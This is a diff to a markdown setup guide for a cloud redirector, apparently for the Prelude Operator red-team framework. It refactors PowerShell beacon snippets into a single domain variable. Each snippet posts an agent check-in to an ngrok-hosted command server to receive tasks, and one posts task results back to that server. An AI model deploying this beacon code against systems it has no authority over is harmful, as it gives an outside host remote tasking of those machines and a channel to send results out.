@@ -30,6 +30,7 @@ Deploy a Cloud Gateway Redirector
 ## Execute Checkin PowerShell
 
 ```
+$PreludeHTTPDomain = "https://boomtown.ngrok.io"
 $Executors = @()
 $Executors += 'psh'
 $Links = @()
@@ -52,7 +53,10 @@ $jsonBase = [pscustomobject]@{
 $delivery = $jsonBase | ConvertTo-Json
 # Checkin - Get Task
 
-$response = Invoke-RestMethod -Uri "https://bdoomtown.ngrok.io" -Method Post -Body $delivery -ContentType "application/json"
+$response = Invoke-RestMethod -Uri $PreludeHTTPDomain -Method Post -Body $delivery -ContentType "application/json"
+$ID = $response.links.ID
+
+
 ```
 
 You should have a call back
@@ -66,6 +70,7 @@ You should have a call back
 
 ```
 
+$PreludeHTTPDomain = "https://boomtown.ngrok.io"
 $Executors = @()
 $Executors += 'psh'
 $Links = @()
@@ -88,7 +93,7 @@ $jsonBase = [pscustomobject]@{
 $delivery = $jsonBase | ConvertTo-Json
 # Checkin - Get Task
 
-$response = Invoke-RestMethod -Uri "https://boomtown.ngrok.io" -Method Post -Body $delivery -ContentType "application/json"
+$response = Invoke-RestMethod -Uri $PreludeHTTPDomain -Method Post -Body $delivery -ContentType "application/json"
 $ID = $response.links.ID
 
 
@@ -119,7 +124,8 @@ $jsonBase = [pscustomobject]@{
 }
 
 $deliveryResponse = $jsonBase | ConvertTo-Json
-$response_delivery = Invoke-RestMethod -Uri "https://boomtown.ngrok.io" -Method Post -Body $deliveryResponse  -ContentType "application/json"
+$response_delivery = Invoke-RestMethod -Uri $PreludeHTTPDomain -Method Post -Body $deliveryResponse  -ContentType "application/json"
+
 ```
 
 ## Check Status
